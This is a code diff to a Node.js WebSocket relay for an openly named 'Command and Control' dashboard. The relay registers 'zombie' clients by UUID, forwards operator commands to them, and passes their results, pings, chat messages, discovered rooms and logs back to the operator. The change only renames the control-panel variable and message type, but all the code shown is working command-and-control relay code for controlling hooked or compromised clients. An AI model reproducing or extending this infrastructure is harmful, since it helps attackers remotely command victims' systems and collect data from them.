@@ -33,7 +33,7 @@ console.debug('DEBUG', 'Static HTTP server started.');
 //endregion
 
 let zombies = {};
-let controlPanelWs = null; // websocket connection to the control panel
+let dashboardWs = null; // websocket connection to the dashboard
 const webSocketServer = new WebSocket.Server({port:8081});
 webSocketServer.on('connection', function(ws) {
     console.log('New connection established.');
@@ -41,25 +41,25 @@ webSocketServer.on('connection', function(ws) {
         let message = JSON.parse(data);
         console.debug(message);
         switch(message.type) {
-            case 'control-panel-connect':
-                console.log('Control panel WebSocket connected');
-                if(controlPanelWs !== null){
-                    console.warn('WARN', 'Previous Control panel WebSocket overwritten.')
+            case 'dashboard-register':
+                console.log('Dashboard WebSocket connected');
+                if(dashboardWs !== null){
+                    console.warn('WARN', 'Previous Dashboard WebSocket overwritten.')
                 }
-                controlPanelWs = ws;
+                dashboardWs = ws;
                 break;
             case 'zombie-register': {
-                if (controlPanelWs === null){
-                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
+                if (dashboardWs === null){
+                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                     return;
                 }
-                if (controlPanelWs.readyState !== WebSocket.OPEN) {
-                    console.error('ERROR', 'Control panel WebSocket is not open. Cannot forward: %s', message);
+                if (dashboardWs.readyState !== WebSocket.OPEN) {
+                    console.error('ERROR', 'Dashboard WebSocket is not open. Cannot forward: %s', message);
                     return;
                 }
                 zombies[message.uuid] = ws;
                 console.log('New zombie:', message.uuid);
-                controlPanelWs.send(data);
+                dashboardWs.send(data);
                 break;
             }
             case 'zombie-cmd':
@@ -80,51 +80,51 @@ webSocketServer.on('connection', function(ws) {
             case 'zombie-result':
             case 'zombie-pong':
             {
-                if (controlPanelWs === null){
-                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
+                if (dashboardWs === null){
+                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                     return;
                 }
-                if(controlPanelWs.readyState !== WebSocket.OPEN){
-                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
+                if(dashboardWs.readyState !== WebSocket.OPEN){
+                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                     return;
                 }
-                controlPanelWs.send(data);
+                dashboardWs.send(data);
                 break;
             }
             case 'chat':
-                if (controlPanelWs === null){
-                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
+                if (dashboardWs === null){
+                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                     return;
                 }
-                if(controlPanelWs.readyState !== WebSocket.OPEN){
-                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
+                if(dashboardWs.readyState !== WebSocket.OPEN){
+                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                     return;
                 }
-                controlPanelWs.send(data);
+                dashboardWs.send(data);
                 console.log('FWD: %s', data);
                 break;
             case 'room-discovered':
-                if (controlPanelWs === null){
-                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
+                if (dashboardWs === null){
+                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                     return;
                 }
-                if(controlPanelWs.readyState !== WebSocket.OPEN){
-                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
+                if(dashboardWs.readyState !== WebSocket.OPEN){
+                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                     return;
                 }
-                controlPanelWs.send(data);
+                dashboardWs.send(data);
                 console.log('FWD: %s', data);
                 break;
             case 'log':
-                if (controlPanelWs === null){
-                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
+                if (dashboardWs === null){
+                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                     return;
                 }
-                if(controlPanelWs.readyState !== WebSocket.OPEN){
-                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
+                if(dashboardWs.readyState !== WebSocket.OPEN){
+                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                     return;
                 }
-                controlPanelWs.send(data);
+                dashboardWs.send(data);
                 console.log('FWD: %s', data);
                 break;
             default:
@@ -134,5 +134,5 @@ webSocketServer.on('connection', function(ws) {
 });
 console.debug('DEBUG', 'Relay WebSocket server started.');
 console.log('In case of errors, please check `relayWebSocketServerUrl` and `webServerUrl` configuration' +
-    ' of the Command and Control panel.');
-console.log('Please open command and control panel in browser.');
+    ' of the Command and Control Dashboard.');
+console.log('Please open Command and Control Dashboard in browser.');
